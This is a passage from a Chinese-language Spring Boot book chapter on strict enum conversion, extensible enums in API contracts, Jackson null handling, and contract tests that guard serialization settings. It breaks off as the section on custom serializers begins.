    private static final List<String> INTERNAL_ONLY = List.of("UNKNOWN", "UNRECOGNIZED");

    @Override
    public <T extends Enum> Converter<String, T> getConverter(Class<T> targetType) {
        return source -> convert(source, targetType);
    }

    private <T extends Enum> T convert(String source, Class<T> targetType) {
        if (source == null || source.isBlank()) {
            return null;
        }
        String trimmed = source.trim();

        for (T candidate : targetType.getEnumConstants()) {
            if (candidate.name().equals(trimmed)) {
                if (INTERNAL_ONLY.contains(candidate.name())) {
                    throw new InvalidEnumValueException(targetType, trimmed,
                            allowedValues(targetType), null);
                }
                return candidate;
            }
        }

        // ★ 大小寫不同的話，給一個明確的提示（而不是靜默接受）
        for (T candidate : targetType.getEnumConstants()) {
            if (candidate.name().equalsIgnoreCase(trimmed)) {
                throw new InvalidEnumValueException(targetType, trimmed,
                        allowedValues(targetType), candidate.name());
            }
        }

        // ★ 拼字建議（03 章 3.9.5 的 Levenshtein 距離）
        String suggestion = DidYouMean.closest(trimmed, allowedValues(targetType));
        throw new InvalidEnumValueException(targetType, trimmed,
                allowedValues(targetType), suggestion);
    }

    private static <T extends Enum> List<String> allowedValues(Class<T> targetType) {
        return Arrays.stream(targetType.getEnumConstants())
                .map(Enum::name)
                .filter(name -> !INTERNAL_ONLY.contains(name))
                .toList();
    }

    /** 未知的 enum 值。 */
    public static class InvalidEnumValueException extends BusinessException {
        public InvalidEnumValueException(Class<?> enumType, String rejected,
                                        List<String> allowed, String suggestion) {
            super(ErrorCode.VALIDATION_FAILED,
                  "Invalid value for enum %s: %s".formatted(enumType.getSimpleName(), rejected),
                  null,
                  buildExtensions(rejected, allowed, suggestion),
                  new Object[0],
                  List.of());
        }

        private static Map<String, Object> buildExtensions(
                String rejected, List<String> allowed, String suggestion) {
            var map = new java.util.LinkedHashMap<String, Object>();
            // ⚠️ 回顯的值要遮蔽與截斷（03 章 3.9.6 的 ValueMasker）
            map.put("rejectedValue", ValueMasker.mask(rejected));
            map.put("allowedValues", allowed);
            if (suggestion != null) {
                map.put("suggestion", suggestion);
                map.put("hint", "「%s」不是有效的值。您是否想輸入「%s」？"
                        .formatted(ValueMasker.mask(rejected), suggestion));
            } else {
                map.put("hint", "「%s」不是有效的值。可用的值：%s"
                        .formatted(ValueMasker.mask(rejected), String.join("、", allowed)));
            }
            return map;
        }
    }
}
```

```java
package example.shop.common.config;

import example.shop.common.web.convert.StrictStringToEnumConverterFactory;
import org.springframework.context.annotation.Configuration;
import org.springframework.format.FormatterRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class ConversionConfig implements WebMvcConfigurer {

    private final StrictStringToEnumConverterFactory enumConverterFactory;

    public ConversionConfig(StrictStringToEnumConverterFactory enumConverterFactory) {
        this.enumConverterFactory = enumConverterFactory;
    }

    @Override
    public void addFormatters(FormatterRegistry registry) {
        // ★ 加在 Spring 內建的 StringToEnumConverterFactory【之前】
        //   ⚠️ FormatterRegistry 沒有「優先順序」的概念，
        //      但後註冊的 ConverterFactory 對同一組型別會覆蓋先前的。
        //      Spring 的內建是在 DefaultFormattingConversionService 的建構子裡註冊，
        //      而 addFormatters 在那之後執行 → 我們的會贏。
        registry.addConverterFactory(enumConverterFactory);
    }
}
```

**效果對照**：

```http
GET /orders?status=PARTIALLY_SHIPPPED
```

**Spring 內建的回應**（03 章的 advice 會把 `MethodArgumentTypeMismatchException` 轉成 400）：

```json
{
  "status": 400,
  "code": "MALFORMED_REQUEST",
  "detail": "Failed to convert value of type 'java.lang.String' to required type 'example.shop.order.domain.OrderStatus'"
}
```

**我們的回應**：

```json
{
  "status": 422,
  "code": "VALIDATION_FAILED",
  "detail": "Invalid value for enum OrderStatus: PARTIALLY_SHIPPPED",
  "rejectedValue": "PARTIALLY_SHIPPPED",
  "allowedValues": ["PENDING_PAYMENT", "PAID", "PARTIALLY_SHIPPED", "SHIPPED",
                    "DELIVERED", "CANCELLED", "REFUNDED"],
  "suggestion": "PARTIALLY_SHIPPED",
  "hint": "「PARTIALLY_SHIPPPED」不是有效的值。您是否想輸入「PARTIALLY_SHIPPED」？"
}
```

⚠️ **狀態碼從 400 變成 422** 是刻意的：
格式是對的（一個字串），語意是錯的（不是合法的狀態）——
那正是 422 的定義（03-rest-api 第 02 章 2.9.2 的「400 vs 422」）。

#### 方向 2：序列化（我們送未知值給客戶端）

**這是 6.2.4 事故的真正原因，而它無法在後端「修好」** ——
但可以讓它變成一個**可控的、有預警的**變更。

**四個必須做的事**：

**① 在契約裡宣告「enum 是開放的」**

```yaml
# orders-api.yaml（03-rest-api 第 07 章）
components:
  schemas:
    OrderStatus:
      type: string
      # ★★ 用 x-extensible-enum 而不是 enum
      #    OpenAPI 的 enum 會讓產生器產生「封閉」的型別（Swift enum、Kotlin enum），
      #    而那正是 App 崩潰的原因。
      #    x-extensible-enum（Zalando 的慣例）讓產生器產生 String + 常數。
      x-extensible-enum:
        - PENDING_PAYMENT
        - PAID
        - PARTIALLY_SHIPPED
        - SHIPPED
        - DELIVERED
        - CANCELLED
        - REFUNDED
      description: |
        訂單狀態。

        ⚠️ **這是一個開放的列舉**：未來可能新增值。
        客戶端**必須**有一個 default 分支處理未知值，
        並使用 `statusLabel` 欄位顯示給使用者。

        新增值的公告方式見「API 變更政策」。
      example: PAID
```

**② 一律附上 `statusLabel`** ★

```java
public record OrderSummary(
    String orderId,
    String status,             // ★ 型別是 String 而不是 OrderStatus enum！
    String statusLabel,        // ★★ 「已出貨」—— 前端【不用】維護對照表
    // ...
) {}
```

⚠️ **`status` 的 DTO 型別是 `String` 而不是 `OrderStatus`** ——
這是一個刻意的決定：

| DTO 型別 | 後果 |
|---|---|
| `OrderStatus`（enum） | ⚠️ 讓人以為「enum 是封閉的」；而且 mapper 忘了轉 label 也不會有編譯錯誤 |
| **`String`** ✅ | 「這是一個開放的字串」在型別上就明確；而且強迫 mapper 同時提供 `statusLabel` |

**`statusLabel` 的價值**（03-rest-api 3.10.2 的落地）：

```
新增 PARTIALLY_SHIPPED：
  · 沒有 statusLabel → 前端要更新對照表 → 舊版 App 顯示 "PARTIALLY_SHIPPED"（原始英文）
                                          或空白，或 crash
  · 有 statusLabel   → ✅ 舊版 App 顯示「部分出貨」—— 完全不用改
```

⚠️ **這是「新增 enum 值不再是破壞性變更」的關鍵**，比任何客戶端的防禦都有效。

```java
package example.shop.order.web;

import example.shop.order.domain.OrderStatus;
import org.springframework.context.MessageSource;
import org.springframework.context.i18n.LocaleContextHolder;
import org.springframework.stereotype.Component;

/**
 * enum → 顯示文字。
 *
 * <p>★ 為什麼要走 i18n 而不是在 enum 裡寫死中文：
 * <ul>
 *   <li>03-rest-api 3.10.3：「列舉值不可以是中文」——
 *       值是機器用的，顯示文字是人用的，兩者的生命週期不同
 *       （文案會改，值不能改）。</li>
 *   <li>營運要改「已出貨」成「已交付物流」時，改一行 properties 就好，
 *       不用改 Java 也不用重新部署（如果用外部的 message source）。</li>
 * </ul>
 */
@Component
public class StatusLabelResolver {

    private final MessageSource messageSource;

    public StatusLabelResolver(MessageSource messageSource) {
        this.messageSource = messageSource;
    }

    /**
     * ★ 泛型入口 —— <b>任何</b>對外的 enum 都走這裡。
     *
     * <p>⚠️ 參數型別是 {@code Enum<?>} 而不是 {@code LabeledEnum}，
     * 是為了讓 07 章 7.8.3 的掃描測試能對「忘記實作介面的 enum」
     * 給出有用的失敗訊息（而不是編譯不過）。
     */
    public String label(Enum<?> value) {
        if (value == null) return null;
        return messageSource.getMessage(
                LabeledEnum.labelKeyOf(value),
                new Object[0],
                // ★ 防禦性 fallback：查不到就回常數名，絕不拋例外
                //   （與 03 章 3.6.3 的 ProblemFactory 同樣的理由）
                //   ⚠️ 而「fallback 被用到」是一個 bug —— 07 章 7.8.3 的
                //      .isNotEqualTo(value.name()) 就是在抓它。
                value.name(),
                LocaleContextHolder.getLocale());
    }

    /** 保留 {@code OrderStatus} 的多載 —— 既有的呼叫端不必改。 */
    public String label(OrderStatus status) {
        return label((Enum<?>) status);
    }
}
```

```properties
# src/main/resources/messages_zh_TW.properties
orderStatus.PENDING_PAYMENT=待付款
orderStatus.PAID=已付款
orderStatus.PARTIALLY_SHIPPED=部分出貨
orderStatus.SHIPPED=已出貨
orderStatus.DELIVERED=已送達
orderStatus.CANCELLED=已取消
orderStatus.REFUNDED=已退款
orderStatus.UNKNOWN=處理中
```

⚠️ **`orderStatus.UNKNOWN=處理中`** 是刻意的：
如果真的有一個 `UNKNOWN` 洩漏到回應裡，
使用者看到「處理中」比看到「UNKNOWN」好得多。

**③ 一個「所有 enum 值都有 label」的測試** ★

```java
package example.shop.contract;

import example.shop.order.domain.OrderStatus;
import example.shop.order.web.StatusLabelResolver;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 「每一個 enum 值都有顯示文字」的測試。
 *
 * <p>★★ 這個測試是「新增 enum 值」的防護網：
 * 加了 {@code PARTIALLY_SHIPPED} 但忘記加 properties 那一行 → <b>測試失敗</b>。
 *
 * <p>如果沒有這個測試，症狀會是「前端顯示 PARTIALLY_SHIPPED（英文原文）」——
 * 一個會上線、會被使用者看到、但不會有任何錯誤日誌的 bug。
 */
@SpringBootTest
class StatusLabelCompletenessTest {

    @Autowired StatusLabelResolver resolver;

    @ParameterizedTest
    @EnumSource(OrderStatus.class)
    @DisplayName("每個 OrderStatus 都有中文的顯示文字")
    void 每個值都有label(OrderStatus status) {
        String label = resolver.label(status);

        assertThat(label)
                .as("OrderStatus.%s 缺少顯示文字。"
                    + "請在 messages_zh_TW.properties 加上 orderStatus.%s=…",
                    status, status)
                .isNotBlank()
                // ★ 關鍵斷言：label 不可以等於常數名
                //   （等於常數名代表 messageSource 用了 fallback，也就是「沒找到」）
                .isNotEqualTo(status.name())
                // ★ 而且要是中文（至少含一個 CJK 字元）
                .matches(".*[\\u4E00-\\u9FFF].*");
    }
}
```

⚠️ **`.isNotEqualTo(status.name())` 這一條是這個測試的核心** ——
因為 `StatusLabelResolver` 有 fallback，所以「查不到」不會拋例外。
沒有這一條斷言，測試永遠會通過。

**④ 新增 enum 值的 checklist**

```markdown
<!-- docs/adding-enum-value.md -->
# 新增一個 enum 值的檢查清單

⚠️ 新增 enum 值對「沒有 default 分支的客戶端」是破壞性變更（06 章 6.2.4）。
以下每一項都必須完成才能合併。

## 後端

- [ ] enum 加上新常數（放在**語意相鄰**的位置，不要放最後 ——
      雖然 `name()` 是契約，`ordinal()` 不是，但如果有任何地方用了 `ordinal()`
      （資料庫的 `@Enumerated(ORDINAL)`！）順序就是契約）
- [ ] `messages_zh_TW.properties` 加上 `orderStatus.XXX=…`
- [ ] `StatusLabelCompletenessTest` 通過
- [ ] `orders-api.yaml` 的 `x-extensible-enum` 加上新值
- [ ] 檢查所有 `switch (status)`：
      `grep -rn "switch.*OrderStatus" src/main/java`
      —— Java 21 對 sealed/enum 的 switch 有窮盡檢查，但只在 switch **表達式**上；
      switch **語句**加了 `default` 就不會提醒你
- [ ] 檢查狀態機的轉移表（`OrderStatus.allowedTransitions()`）
- [ ] 檢查資料庫的 `CHECK` 約束或 enum 型別（07-mysql）

## 契約與通知

- [ ] 在 API changelog 記錄，標記「新增列舉值」
- [ ] 通知所有已知的客戶端團隊（iOS / Android / Web / 合作夥伴）
- [ ] 確認每個客戶端都有 default 分支 —— **口頭確認不算，要看程式碼**
- [ ] 給至少 2 週的緩衝期再開始回傳新值

## 上線

- [ ] 用 feature flag 控制「開始回傳新值」，而不是隨程式碼一起上線
- [ ] 上線後觀察客戶端的 crash 率（Crashlytics / Sentry）
- [ ] 準備一個「立刻停止回傳新值」的開關

## 為什麼要這麼麻煩

2026-07-14：新增 `PARTIALLY_SHIPPED`，四小時內 340 則一星評論。
成本：緊急發版（iOS 審核 18 小時）+ 客服量 3 倍 + 商譽。
```

⚠️ **「用 feature flag 控制開始回傳新值」是最重要的一項**：
它把「新增 enum 值」從「一次不可逆的部署」變成「一個可以立刻關掉的開關」。

### 6.5.9 `null`、缺欄位、與 `default-property-inclusion` 的交互作用

**01 章 1.6.4 已經介紹了 `JsonNullable`。這裡看它與全域設定的衝突。**

**四種狀態**（03-rest-api 3.7.1）：

| JSON | 語意 | `JsonNullable` |
|---|---|---|
| 欄位不出現 | 「不要動這個欄位」 | `undefined()` |
| `"field": null` | 「把這個欄位清空」 | `of(null)` |
| `"field": ""` | 「設成空字串」⚠️ 通常該拒絕 | `of("")` |
| `"field": "值"` | 「設成這個值」 | `of("值")` |

**衝突：`default-property-inclusion: non_null` 讓「回應」無法表達 `null`。**

```java
public record OrderDetail(
    String orderId,
    String customerNote,        // 使用者沒填備註 → null
    ShippingAddress address
) {}
```

```json
// 設定 non_null 的回應
{ "orderId": "ord_1", "address": { ... } }
// ★ customerNote 完全消失
```

**這對客戶端造成一個實際的問題**：

```javascript
// 前端無法區分這兩種情況：
//   (a) 這個訂單沒有備註
//   (b) 這個 API 版本還沒有 customerNote 這個欄位
if (order.customerNote === undefined) { /* 是哪一種？ */ }
```

⚠️ **對大多數欄位這不重要**（前端顯示空白就對了）。
**但對「布林」與「集合」很重要**：

```java
public record OrderDetail(
    // ...
    Boolean giftWrapped,               // 🔴 null → 欄位消失 → 前端的 `if (o.giftWrapped)` 是 false，
                                       //    但 undefined 與 false 在語意上不同
    List<String> allowedActions        // 🔴 空 list 不會消失（不是 null），
                                       //    但 null 會 → 前端的 `.map()` 會 crash
) {}
```

**shop-service 的三條規則**：

```java
package example.shop.order.web.dto;

import com.fasterxml.jackson.annotation.JsonInclude;

/**
 * 訂單詳情。
 *
 * <p>★★ 三條「型別即契約」的規則（6.5.9）：
 * <ol>
 *   <li><b>集合永遠不是 null</b> —— 用 {@code List.of()}。
 *       這讓前端的 {@code .map()} / {@code .length} 永遠安全，
 *       而 {@code non_null} 不會省略空集合（空 list 不是 null）。</li>
 *   <li><b>布林用 {@code boolean} 而不是 {@code Boolean}</b> ——
 *       原始型別不可能是 null，所以欄位一定出現。
 *       ⚠️ 例外：真的有「未知」語意的布林（例如「是否為 VIP，尚未計算」）
 *       才用 {@code Boolean}，而那時要在 javadoc 說明三種狀態。</li>
 *   <li><b>「一定會有值」的欄位用 {@code @JsonInclude(ALWAYS)} 覆寫全域設定</b> ——
 *       讓契約穩定（客戶端可以依賴它一定存在）。</li>
 * </ol>
 */
public record OrderDetail(

    // ── 規則 3：一定存在的欄位 ─────────────────────────────────
    @JsonInclude(JsonInclude.Include.ALWAYS)
    String orderId,

    @JsonInclude(JsonInclude.Include.ALWAYS)
    String status,

    @JsonInclude(JsonInclude.Include.ALWAYS)
    String statusLabel,

    @JsonInclude(JsonInclude.Include.ALWAYS)
    Amounts amounts,

    @JsonInclude(JsonInclude.Include.ALWAYS)
    java.time.Instant createdAt,

    // ── 規則 2：布林用原始型別 ─────────────────────────────────
    boolean giftWrapped,
    boolean invoiceIssued,

    // ── 規則 1：集合永不為 null ───────────────────────────────
    @JsonInclude(JsonInclude.Include.ALWAYS)
    java.util.List<OrderItemResponse> items,

    @JsonInclude(JsonInclude.Include.ALWAYS)
    java.util.List<String> allowedActions,

    // ── 真正選填的欄位：讓 non_null 省略它們 ────────────────────
    String customerNote,
    ShippingAddress shippingAddress,
    java.time.Instant paidAt,
    java.time.Instant shippedAt,
    InvoiceResponse invoice

) {
    /**
     * ★ 正規化建構子：把 null 集合換成空集合。
     *
     * <p>這比「要求每個 mapper 記得傳空集合」可靠得多 ——
     * 因為它是型別自己的責任。
     */
    public OrderDetail {
        items          = (items == null)          ? java.util.List.of() : java.util.List.copyOf(items);
        allowedActions = (allowedActions == null) ? java.util.List.of() : java.util.List.copyOf(allowedActions);
    }
}
```

⚠️ **`@JsonInclude(ALWAYS)` 加在 record 元件上需要注意**：
`@JsonInclude` 的 `@Target` 含 `FIELD`、`METHOD`、`PARAMETER`、`TYPE`，
**在 Java 16+ 的 record 上，標在元件上的註解會被傳播到欄位與 accessor**
（因為 record 元件的註解會依 `@Target` 自動傳播）。
所以上面的寫法可以運作 —— **但如果 Jackson 的版本較舊，行為可能不同**。

**一個更保險（但囉唆）的寫法**：在型別上宣告，個別欄位用 `non_null` 覆寫：

```java
/**
 * ★ 反過來做：型別層級用 ALWAYS，只有「真正選填」的欄位標 NON_NULL。
 *
 * <p>優點：預設是「欄位一定出現」，那是更穩定的契約。
 * 缺點：回應大約 15～30% —— 需要衡量（我們的訂單詳情約多 400 bytes）。
 */
@JsonInclude(JsonInclude.Include.ALWAYS)
public record OrderDetail(
    String orderId,
    String status,
    // ...
    @JsonInclude(JsonInclude.Include.NON_NULL) String customerNote,
    @JsonInclude(JsonInclude.Include.NON_NULL) java.time.Instant paidAt
) {}
```

**兩種做法的取捨**：

| | 全域 `non_null` + 個別 `ALWAYS` | 全域 `non_null` + 型別 `ALWAYS` |
|---|---|---|
| 回應大小 | 小 | 大 15～30% |
| 契約穩定性 | ⚠️ 要記得標註 | ✅ 預設穩定 |
| 忘記標註的後果 | 欄位偶爾消失（前端要防禦） | 多一個 `"x": null`（無害） |
| shop-service | ✅ 用這個（回應大小重要 —— 商品列表一次 20 筆） | — |

⚠️ **選了 `non_null` 就要在 API 文件裡明確寫**：

```yaml
# orders-api.yaml
info:
  description: |
    ## null 的處理

    **回應**：`null` 的欄位**不會出現**在 JSON 裡。
    客戶端必須把「欄位不存在」與「欄位是 null」視為相同。

    以下欄位**保證一定出現**（即使值是空的）：
    `orderId`、`status`、`statusLabel`、`amounts`、`createdAt`、
    `items`（可能是 `[]`）、`allowedActions`（可能是 `[]`）、
    以及所有 `boolean` 欄位。

    **請求**：
    - `PATCH` 使用 merge-patch 語意（RFC 7396）：
      欄位不出現 = 不修改；欄位是 `null` = 清空。
    - `POST` / `PUT`：欄位不出現與 `null` 等價。
```

### 6.5.10 哪些 Jackson 設定變更是破壞性的 ★

**這是一張很值得貼在牆上的表。**

| 設定變更 | 破壞性？ | 症狀 |
|---|---|---|
| `default-property-inclusion` `non_null` → `always` | ⚠️ **通常安全** | 回應多出 `"x": null`。客戶端如果用 `Object.keys().length` 判斷會壞 |
| `default-property-inclusion` `always` → `non_null` | 🔴 **破壞性** | 客戶端存取 `order.customerNote.length` → `TypeError`（欄位消失了） |
| `write-dates-as-timestamps` `false` → `true` | 🔴🔴 **嚴重** | `"2026-08-24T03:14:22Z"` → `1756005262.000000000`。**所有時間解析全部壞掉** |
| `fail-on-unknown-properties` `false` → `true` | 🔴 **破壞性** | 送了多餘欄位的客戶端從 200 變 400 |
| `fail-on-unknown-properties` `true` → `false` | ⚠️ 安全但危險 | 打錯字的欄位開始被靜默忽略（6.5.5 的災難） |
| `property-naming-strategy` 任何變更 | 🔴🔴🔴 **全部壞掉** | 所有欄位名都改了 |
| 加一個 `Module` | ⚠️ **要檢查** | 它可能改變既有型別的序列化（例如 `Hibernate6Module` 會讓未初始化的關聯變成 `null`） |
| `accept-case-insensitive-enums` `false` → `true` | ⚠️ 安全（放寬） | 但之後要收緊回去就是破壞性的 |
| `write-bigdecimal-as-plain` `false` → `true` | ⚠️ **通常安全** | `1.0E+7` → `10000000`。客戶端如果用字串比較會壞 |
| `indent-output` `false` → `true` | ⚠️ 安全但浪費 | 回應大 20～30%；**NDJSON 端點會完全壞掉**（05 章 5.9.4） |
| `use-big-decimal-for-floats` `false` → `true` | ⚠️ 安全（更精確） | 但如果既有邏輯依賴 `double` 的行為，可能有微妙差異 |

⚠️ **`write-dates-as-timestamps` 那一列是「一行設定造成全站故障」的典型**，
而它很容易發生：有人為了讓某一個內部端點輸出 epoch 數字，
改了全域設定而不是那個欄位的 `@JsonFormat`。

**一個守住這些設定的契約測試** ★

```java
package example.shop.contract;

import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.fasterxml.jackson.annotation.JsonInclude;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 「Jackson 的關鍵設定沒有被改動」的契約測試。
 *
 * <p>★★ 為什麼需要它：6.5.10 那張表裡的每一項都是「一行 YAML 造成全站故障」。
 * 而這類改動在 code review 裡看起來完全無害
 * （「我只是加了一行 spring.jackson.serialization.indent-output: true 來方便除錯」）。
 *
 * <p>★ 這個測試的訊息刻意寫得很長 ——
 * 它的讀者是「測試失敗時的那個工程師」，而他需要知道
 * (a) 為什麼這個設定是這樣 (b) 如果他真的要改，該怎麼做。
 */
@SpringBootTest
class JacksonContractTest {

    @Autowired ObjectMapper objectMapper;

    @Test
    @DisplayName("時間一定是 ISO-8601 字串而不是 epoch 數字")
    void 時間格式() {
        assertThat(objectMapper.isEnabled(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS))
                .as("""
                    WRITE_DATES_AS_TIMESTAMPS 被啟用了。

                    這會把所有時間欄位從 "2026-08-24T03:14:22.000Z"
                    變成 1756005262.000000000 —— 所有客戶端的時間解析都會壞掉。

                    如果你需要某一個欄位輸出 epoch，請在【那個欄位】上用
                        @JsonFormat(shape = JsonFormat.Shape.NUMBER)
                    而不要改全域設定。
                    """)
                .isFalse();
    }

    @Test
    @DisplayName("未知欄位要報錯")
    void 未知欄位() {
        assertThat(objectMapper.isEnabled(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES))
                .as("""
                    FAIL_ON_UNKNOWN_PROPERTIES 被關掉了（06 章 6.5.5）。

                    後果：客戶端送 { "quantiy": 5 }（打錯字）時會被靜默忽略，
                    然後 quantity 用預設值 → 使用者買到錯的數量。

                    如果某個 DTO 真的需要容忍未知欄位（例如第三方的 webhook），
                    請在【那個 DTO】上用 @JsonIgnoreProperties(ignoreUnknown = true)。
                    """)
                .isTrue();
    }

    @Test
    @DisplayName("回應不縮排（NDJSON 端點依賴這一點）")
    void 不縮排() {
        assertThat(objectMapper.isEnabled(SerializationFeature.INDENT_OUTPUT))
                .as("""
                    INDENT_OUTPUT 被啟用了。

                    兩個後果：
                    1. 所有回應大 20～30%
                    2. GET /orders.ndjson 完全壞掉 —— NDJSON 依賴「一筆一行」，
                       而縮排會讓一筆變成很多行（05 章 5.9.4）

                    除錯時想看格式化的 JSON，請用 `curl ... | jq`。
                    """)
                .isFalse();
    }

    @Test
    @DisplayName("BigDecimal 不用科學記號")
    void 不用科學記號() {
        assertThat(objectMapper.getFactory()
                        .isEnabled(com.fasterxml.jackson.core.JsonGenerator.Feature
                                .WRITE_BIGDECIMAL_AS_PLAIN))
                .as("WRITE_BIGDECIMAL_AS_PLAIN 被關掉了 —— 見 06 章 6.2.3 的事故")
                .isTrue();
    }

    @Test
    @DisplayName("命名策略沒有被設定（用 Java 的欄位名）")
    void 命名策略() {
        assertThat(objectMapper.getSerializationConfig().getPropertyNamingStrategy())
                .as("""
                    PropertyNamingStrategy 被設定了（06 章 6.5.4）。

                    這會改變【每一個】欄位名 —— 所有客戶端全部壞掉。
                    這是本專案最嚴重的破壞性變更之一。
                    """)
                .isNull();
    }

    @Test
    @DisplayName("預設包含策略是 NON_NULL")
    void 包含策略() {
        assertThat(objectMapper.getSerializationConfig()
                        .getDefaultPropertyInclusion().getValueInclusion())
                .isEqualTo(JsonInclude.Include.NON_NULL);
    }

    @Test
    @DisplayName("JavaTimeModule 有註冊")
    void 時間模組() {
        assertThat(objectMapper.getRegisteredModuleIds())
                .as("缺少 JavaTimeModule —— Instant 會序列化成 {\"seconds\":...}")
                .anyMatch(id -> String.valueOf(id).contains("JavaTimeModule")
                             || String.valueOf(id).contains("jsr310"));
    }

    @Test
    @DisplayName("StreamReadConstraints 有設定（安全上限）")
    void 安全上限() {
        var constraints = objectMapper.getFactory().streamReadConstraints();

        assertThat(constraints.getMaxNestingDepth())
                .as("maxNestingDepth 太大 —— JSON 深度炸彈的防護（06 章 6.7.3）")
                .isLessThanOrEqualTo(50);
        assertThat(constraints.getMaxStringLength())
                .as("maxStringLength 太大 —— Jackson 的預設 20MB 對我們太寬鬆")
                .isLessThanOrEqualTo(1_000_000);
        assertThat(constraints.getMaxDocumentLength())
                .as("maxDocumentLength 沒設定")
                .isGreaterThan(0)
                .isLessThanOrEqualTo(2_000_000);
    }

    @Test
    @DisplayName("★ 沒有啟用 default typing（RCE 風險）")
    void 沒有defaultTyping() {
        // ★ 用「序列化一個 Object 欄位」來偵測：
        //   啟用 default typing 時輸出會含型別資訊（["java.lang.String","x"]）
        record Holder(Object value) {}
        String json;
        try {
            json = objectMapper.writeValueAsString(new Holder("x"));
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        assertThat(json)
                .as("""
                    輸出含型別資訊 —— 可能啟用了 activateDefaultTyping()。

                    那是一個遠端程式碼執行的漏洞（06 章 6.7.1）。
                    絕不可以在處理不可信輸入的 ObjectMapper 上啟用它。
                    """)
                .isEqualTo("{\"value\":\"x\"}");
    }

    @Test
    @DisplayName("★ 一個端到端的格式驗證")
    void 端到端格式() throws Exception {
        record Sample(
                java.time.Instant timestamp,
                java.math.BigDecimal decimal,
                String present,
                String absent,
                java.util.List<String> emptyList) {}

        String json = objectMapper.writeValueAsString(new Sample(
                java.time.Instant.parse("2026-08-24T03:14:22.123456789Z"),
                new java.math.BigDecimal("1E+7"),
                "value",
                null,
                java.util.List.of()));

        assertThat(json)
                // ★ 時間截斷到毫秒且固定三位（6.5.6）
                .contains("\"timestamp\":\"2026-08-24T03:14:22.123Z\"")
                // ★ BigDecimal 不用科學記號（6.5.7）
                .contains("\"decimal\":10000000")
                .contains("\"present\":\"value\"")
                // ★ null 欄位消失（6.5.9）
                .doesNotContain("absent")
                // ★ 空集合【不】消失
                .contains("\"emptyList\":[]");
    }
}
```

⚠️ **最後那個「端到端格式」測試最有價值** ——
它一次驗證了五個設定的**合成效果**，而那是任何單一設定的斷言看不出來的。

---

## 6.6 自訂序列化器

### 6.6.1 七種介入序列化的方式與選擇

| 方式 | 作用範圍 | 適合 |
|---|---|---|
| **`@JsonFormat`** | 單一欄位 | 格式微調（日期 pattern、enum 的 shape） |
| **`@JsonSerialize(using = ...)`** | 單一欄位 | 這個欄位需要特殊邏輯 |
| **`@JsonValue` / `@JsonCreator`** | 一個型別 | 值型別（`Money`、`OrderId`）—— ✅ **最乾淨** |
| **`Module` 註冊 `JsonSerializer<T>`** | 全域，所有 `T` | ⚠️ 只有在「對所有 `T` 都正確」時才用（6.5.7 的教訓） |
| **Spring 的 `Converter<String, T>`** | 全域，但**只作用於非 body 的參數** | `@RequestParam` / `@PathVariable` / `@RequestHeader` |
| **`ResponseBodyAdvice`** | 所有回應（可用 `supports()` 縮小） | 需要「知道是哪個 handler」的後處理（稀疏欄位集，6.6.4） |
| **`RequestBodyAdvice`** | 所有請求 body（同上） | 需要「知道會綁成哪個型別」的前處理（解密、稽核，6.6.5） |

⚠️ **最後兩列與前五列的分界**：
前五列作用在**型別或欄位**上，後兩列作用在**「這一次的 HTTP 交換」**上 ——
所以只有後兩列拿得到 `MethodParameter`（是哪個 handler、有什麼註解）。

**選擇的第一個問題永遠是：「這件事跟 HTTP 有關嗎？」**
無關（`Money` 怎麼印）→ 前五列。
有關（這個端點的這個參數要不要解密）→ 後兩列。

⚠️ **最後一列是一個非常容易搞混的分界，值得單獨畫出來**：

```
                     ┌─────────────────────────────────────────┐
   request body ────▶│ HttpMessageConverter → Jackson           │
   （JSON）           │  · @JsonDeserialize / @JsonCreator       │
                     │  · Module 註冊的 JsonDeserializer<T>      │
                     │  · spring.jackson.deserialization.*       │
                     └─────────────────────────────────────────┘

  @RequestParam       ┌─────────────────────────────────────────┐
  @PathVariable  ────▶│ ConversionService → Converter / Formatter │
  @RequestHeader      │  · Converter<String, T>                  │
  @CookieValue        │  · ConverterFactory<String, Enum>        │
  @ModelAttribute     │  · @DateTimeFormat / @NumberFormat       │
  （查詢參數）         │  ★ Jackson 的設定【完全不生效】           │
                     └─────────────────────────────────────────┘
```

**這條分界造成過三個真實的困惑**：

| 症狀 | 原因 |
|---|---|
| `spring.jackson.deserialization.read-unknown-enum-values-using-default-value: true` 設了，但 `?status=XXX` 還是 400 | ⚠️ 查詢參數不走 Jackson（6.5.8 方向 1b） |
| `LenientInstantDeserializer`（6.5.6）寫好了，但 `?createdFrom=1756005262` 還是失敗 | 同上 —— 查詢參數需要一個 `Converter<String, Instant>` |
| `@JsonFormat(pattern = "yyyy-MM-dd")` 加在 record 元件上，`@ModelAttribute` 綁定時無效 | `@ModelAttribute` 走 `ConversionService`，要用 `@DateTimeFormat` |

⚠️ **所以「同一個型別可能需要兩份轉換邏輯」** ——
`Instant` 在 body 裡走 `LenientInstantDeserializer`，
在查詢參數裡走 `Converter<String, Instant>`。
**兩者的接受範圍必須一致**，否則會出現「同一個值在 body 裡可以、在查詢參數裡不行」。

**shop-service 的做法：讓兩者共用同一個解析函式。**

```java
package example.shop.common.web.convert;

import org.springframework.core.convert.converter.Converter;
import org.springframework.stereotype.Component;

import java.time.Instant;

/**
 * 查詢參數的 {@link Instant} 轉換。
 *
 * <p>★★ 它與 {@code LenientInstantDeserializer}（6.5.6）<b>共用同一份解析邏輯</b>
 * （{@link InstantParsing#parse}），確保：
 * <pre>
 *   POST /orders  { "scheduledAt": "2026-08-24T11:14:22+08:00" }   ✅ 可以
 *   GET  /orders?createdFrom=2026-08-24T11:14:22%2B08:00           ✅ 也可以
 * </pre>
 *
 * <p>⚠️ 沒有共用的話會出現「同一個格式在 body 裡可以、在查詢參數裡不行」——
 * 那種不一致對客戶端來說完全無法理解。
 */
